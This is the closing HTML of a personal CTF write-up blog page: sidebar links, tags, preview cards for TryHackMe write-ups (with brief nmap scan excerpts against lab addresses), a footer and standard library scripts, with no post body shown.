ml-1 mt-2"><li><a href="/posts/tic-tac-toe-minimax/">Tic Tac Toe - AI with Minimax algorithm</a><li><a href="/posts/cryptohack-no-way-jose/">CryptoHack - No way jose</a><li><a href="/posts/RSA-STARTER-06/">CryptoHack - RSA Starter 6</a><li><a href="/posts/salty/">CryptoHack - Salty</a><li><a href="/posts/manyprimes/">CryptoHack - Manyprimes</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/challenge/">Challenge</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/rsa/">RSA</a> <a class="post-tag" href="/tags/math/">math</a> <a class="post-tag" href="/tags/modular-math/">modular math</a> <a class="post-tag" href="/tags/factorization/">factorization</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/thm/">THM</a> <a class="post-tag" href="/tags/aes/">AES</a> <a class="post-tag" href="/tags/easy/">easy</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/THM-CyberHeroes/"><div class="card-body"> <em class="timeago small" data-ts="1654041600" > 2022-06-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>THM - CyberHeroes</h3><div class="text-muted small"><p> Enumeration Nmap Let’s start by using nmap to see which ports are open └─$ nmap -A 10.10.125.139 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 03:21 EDT Nmap scan report for 10.10.125.139...</p></div></div></a></div><div class="card"> <a href="/posts/THM-nine-nine/"><div class="card-body"> <em class="timeago small" data-ts="1654041600" > 2022-06-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>THM - Brooklyn Nine Nine</h3><div class="text-muted small"><p> Information Gathering Nmap We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities. Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 11:...</p></div></div></a></div><div class="card"> <a href="/posts/THM-pickle-rick/"><div class="card-body"> <em class="timeago small" data-ts="1654041600" > 2022-06-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>THM - Picke Rick</h3><div class="text-muted small"><p> Nmap As always, we start by scanning all opened ports with nmap └─$ nmap -A 10.10.164.56 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-01 14:14 EDT Nmap scan report for 10.10.164.56 Host...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/THM-pickle-rick/" class="btn btn-outline-primary" prompt="Older"><p>THM - Picke Rick</p></a> <a href="/posts/THM-root-me/" class="btn btn-outline-primary" prompt="Newer"><p>THM - Root Me</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://github.com/username">NiBi</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."></span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/challenge/">Challenge</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/rsa/">RSA</a> <a class="post-tag" href="/tags/math/">math</a> <a class="post-tag" href="/tags/modular-math/">modular math</a> <a class="post-tag" href="/tags/factorization/">factorization</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/thm/">THM</a> <a class="post-tag" href="/tags/aes/">AES</a> <a class="post-tag" href="/tags/easy/">easy</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Nothing yet :(</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
